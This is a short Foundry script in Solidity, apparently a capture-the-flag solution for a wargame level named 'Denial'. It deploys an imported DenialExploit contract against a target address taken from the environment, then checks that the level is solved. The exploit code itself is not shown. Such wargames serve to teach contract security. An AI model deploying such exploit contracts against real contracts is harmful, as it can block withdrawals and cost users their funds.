pragma solidity ^0.8.14;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Denial} from "../src/Level20.sol";
import {DenialExploit} from "../src/Level20Exploit.sol";

contract Level20Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target) private {
        DenialExploit e = new DenialExploit(_target);
    }

    function levelDone(address _target) private returns (bool) {
        return Denial(payable(_target)).partner() != address(0);
    }
}
